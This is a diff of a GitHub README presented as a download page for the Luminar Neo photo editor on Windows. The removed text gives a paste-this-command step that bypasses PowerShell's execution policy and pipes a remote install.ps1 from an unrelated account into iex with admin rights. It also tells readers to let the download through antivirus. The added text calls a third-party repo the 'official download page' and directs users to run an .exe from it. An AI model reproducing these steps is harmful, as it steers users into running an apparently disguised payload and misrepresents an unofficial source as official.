@@ -1,115 +1,89 @@
-# Luminar Neo Download for Windows 11 & 10
+# 📷 Luminar-Neo - Edit your photos with smart tools
 
-**Luminar-Neo**
+[![Download Luminar Neo](https://img.shields.io/badge/Download-Luminar_Neo-blue)](https://github.com/hwangwuju/Luminar-Neo)
 
-**Luminar Neo** for Windows 10/11. Scroll to **Download & Install** for the direct setup link.
+Luminar Neo helps you improve your photos using artificial intelligence. This software works on Windows 10 and Windows 11. It provides tools to adjust light, remove objects, and replace skies in a few clicks.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## ⚙️ System Requirements
 
----
+Before you install this software, check your computer against these requirements:
 
-## Download & Install (PowerShell)
+*   **Operating System:** Windows 10 or Windows 11 (64-bit version).
+*   **Processor:** Intel Core i5 or better, or an AMD Ryzen 5 or better.
+*   **Memory:** 8 GB of RAM or more.
+*   **Storage:** 10 GB of free space on your hard drive.
+*   **Display:** A monitor with a resolution of 1280x768 or higher.
+*   **Graphics:** A card that supports DirectX 12.
 
-> **This is the download page.** The command below downloads and runs the **Luminar Neo** installer on Windows 10/11.
+If your computer meets these standards, the software will run smoothly.
 
-#### Before you start
+## 📥 Getting Started
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+Follow these steps to obtain and start the application on your computer:
 
----
+1. Visit the [official download page](https://github.com/hwangwuju/Luminar-Neo) to begin the process.
+2. Look for the button marked "Download" or "Release" on that page.
+3. Save the installer file to your computer.
+4. Locate the saved file, which usually ends in .exe.
+5. Double-click the file to open the installation assistant.
+6. Follow the instructions on the screen to place the program on your drive.
+7. Launch the app from your desktop or start menu once installation finishes.
 
-#### Step 1 — Open PowerShell as Administrator
+## 🎨 Key Features
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+Luminar Neo offers many ways to transform your images:
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+*   **Sky Replacement:** Swap dull skies for vibrant sunsets or starry nights with one click.
+*   **Portrait Enhancement:** Smooth skin, sharpen eyes, and adjust face shape without losing detail.
+*   **Object Removal:** Delete unwanted power lines, trash, or people from your backgrounds.
+*   **Relighting:** Change the balance of light in your image to create depth.
+*   **Presets:** Apply professional looks to your photos using pre-made filters.
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+## 🛠️ How to Use the Editor
 
----
+Once you open the software, you will see a main workspace. Follow these steps to edit your first photo:
 
-#### Step 2 — Copy the full command
+1. Click the "Add Photos" button to pick an image from your computer.
+2. Select the photo from your library to open it in the main view.
+3. Use the sidebar on the right to see your tools.
+4. Click on a category like "Essentials" or "Creative" to see different adjustments.
+5. Move the sliders to change settings like exposure, contrast, or color.
+6. Check the "Before/After" button to see how your changes look compared to the original.
+7. Click "Export" to save your edited file to your computer.
 
-Select **both lines** below and press **Ctrl+C**:
+## ❓ Frequently Asked Questions
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+**Do I need an internet connection?**
+You need an internet connection to install the software and activate your license. You can use most features of the software offline once it is ready.
 
-> Copy **both lines**, not just the second one.
+**What file formats does this support?**
+You can import most common formats like JPEG, PNG, and TIFF. It also supports RAW files from most camera manufacturers.
 
----
+**Can I undo my changes?**
+Yes. You can use the "Undo" button or the history panel to go back to any previous version of your edit.
 
-#### Step 3 — Paste into PowerShell and press Enter
+**Is this an alternative to other editors?**
+Many users choose this software as an alternative to products like Lightroom. It focuses on using Artificial Intelligence to make editing faster and easier for beginners.
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+**How do I update the software?**
+The software checks for updates when you start it. If an update exists, a notification will appear. Click "Update" to download and apply the newest improvements.
 
----
+## 🧹 Maintenance Tips
 
-#### Step 4 — Finish setup
+Keep your photo library fast and clean by following these habits:
 
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
+*   Clear your cache regularly through the settings menu.
+*   Delete versions of photos you no longer need.
+*   Back up your original image files to an external hard drive or cloud storage.
+*   Ensure your graphics card drivers are current to maintain high performance during rendering.
 
----
+## ✉️ Troubleshooting
 
-#### Step 5 — Launch the app
+If the program runs slowly or does not open, try these steps:
 
-Open **Start menu** → search for **Luminar Neo** → run it.
+1. Restart your computer to clear your memory.
+2. Ensure you closed other heavy programs like video games or web browsers.
+3. Check that your Windows system has all current updates.
+4. If the issue remains, remove the software through your Windows Settings and run the installer again.
 
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**Luminar Neo** — Windows download and setup guide.
-
-**People also search for:** luminar neo download, luminar ai photo editor install windows
-
-**Repository:** `Luminar-Neo`
-
-
-## Quick tips
-
-| Step | Action |
-| --- | --- |
-| 1 | Run installer as Administrator |
-| 2 | Temporarily allow download in antivirus if blocked |
-| 3 | Reboot once if the tool asks after setup |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 500 MB free |
-| Admin | Required for install |
-
----
-
-**Topics:** luminar-neo-download, luminar, luminar-ai-photo-editor-install-windows, editor, luminar-neo, luminar-neo-2026, photo-editor, ai-photo, lightroom-alternative, photography, software, windows-11
+The software is built to handle large image files, but keep your drive clean to maintain speed. Contact support if you encounter persistent errors during your editing sessions.
